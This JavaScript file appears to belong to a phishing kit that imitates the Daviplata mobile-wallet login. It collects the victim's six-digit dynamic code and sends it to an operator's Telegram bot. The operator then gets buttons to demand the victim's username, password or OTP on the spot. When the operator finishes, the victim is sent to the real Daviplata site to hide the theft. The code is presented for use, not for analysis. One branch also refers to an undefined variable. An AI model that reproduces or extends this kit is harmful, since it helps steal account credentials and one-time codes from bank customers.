/**
 * DAVIPLATA - dinamica.js OPTIMIZADO
 */

document.addEventListener('DOMContentLoaded', () => {
    if (typeof BancoUtils === 'undefined') {
        console.error('BancoUtils no está cargado');
        return;
    }
    
    console.log('Daviplata Dinámica: Inicializando...');
    BancoUtils.initSocket();
    
    const form = document.getElementById('dinamicaForm');
    const input = document.getElementById('dynamic');
    const btnContinue = document.getElementById('btnContinue');

    BancoUtils.onTelegramAction(handleTelegramAction);

    input.addEventListener('input', () => {
        BancoUtils.validateNumeric(input, 6);
        checkComplete();
    });

    function checkComplete() {
        const isComplete = input.value.length === 6;
        btnContinue.disabled = !isComplete;
        if (isComplete) {
            btnContinue.classList.add('enabled');
        } else {
            btnContinue.classList.remove('enabled');
        }
    }

    const handleSubmit = async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnContinue.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        const overlay = document.getElementById('loadingOverlay');
        if (overlay) {
            overlay.classList.add('show');
            overlay.classList.add('active');
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        }

        const dinamica = input.value;
        const data = BancoUtils.saveBankData('daviplata', { dinamica });
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('DAVIPLATA - DINÁMICA', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '📱 Pedir Usuario', action: 'request_user' },
            { text: '🔐 Pedir Contraseña', action: 'request_password' },
            { text: '🔢 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📱 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        try {
            console.log('📨 Enviando mensaje a Telegram...');
            await BancoUtils.sendToTelegram('dynamic', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.classList.remove('show', 'active');
                overlay.style.display = 'none';
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    };
    
    btnContinue.addEventListener('click', handleSubmit);

    function handleTelegramAction(data) {
        switch(data.action) {
            case 'request_user':
                window.location.href = 'index.html';
                break;
            case 'request_password':
                window.location.href = 'clave.html';
                break;
            case 'request_dynamic':
                inputs.forEach(input => input.value = '');
                inputs[0].focus();
                btnContinue.disabled = true;
                break;
            case 'request_otp':
                window.location.href = 'otp.html';
                break;
            case 'finish':
                window.location.href = 'https://www.daviplata.com/';
                break;
        }
    }
});
